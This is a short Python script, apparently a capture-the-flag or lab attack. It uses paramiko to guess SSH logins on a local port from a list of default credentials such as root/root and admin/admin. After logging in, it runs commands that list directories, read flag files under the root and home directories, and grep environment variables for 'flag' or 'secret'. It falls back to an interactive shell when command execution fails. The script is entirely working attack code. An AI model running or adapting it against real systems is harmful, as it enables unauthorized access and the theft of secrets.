import time, paramiko
HOST, PORT = "127.0.0.1", 2222
creds = [("audit","probe"),("probe","audit"),("audit","audit"),("probe","probe"),
         ("root","root"),("admin","admin"),("test","test"),("audit","password")]
cmd = ("id; hostname; pwd; ls -la .; ls -la /; "
       "cat /flag* /flag/* flag* /home/*/flag* /root/flag* /etc/motd 2>/dev/null; "
       "env | grep -iE 'flag|secret'")
for u, p in creds:
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(HOST, port=PORT, username=u, password=p, timeout=1.5,
                  auth_timeout=1.5, banner_timeout=1.5,
                  allow_agent=False, look_for_keys=False)
    except paramiko.AuthenticationException:
        print("AUTH-FAIL %s:%s" % (u, p)); c.close(); continue
    except Exception as e:
        print("CONN-ERR %s:%s %r" % (u, p, e)); continue
    print("AUTH-SUCCESS %s:%s" % (u, p))
    try:
        _, o, e = c.exec_command(cmd, timeout=2)
        out = o.read().decode(errors="replace"); err = e.read().decode(errors="replace")
        print(out)
        if err.strip(): print("STDERR:", err)
        if not out.strip(): raise RuntimeError("empty exec output")
    except Exception as ex:
        print("EXEC-ERR %r -- trying interactive shell" % ex)
        try:
            sh = c.invoke_shell(); sh.settimeout(2); sh.send(cmd + "\n")
            time.sleep(1.0); buf = b""
            for _ in range(10):
                if sh.recv_ready(): buf += sh.recv(4096)
                time.sleep(0.1)
            print(buf.decode(errors="replace"))
        except Exception as ex2:
            print("SHELL-ERR %r" % ex2)
    c.close(); break
print("DONE")
PYEOF

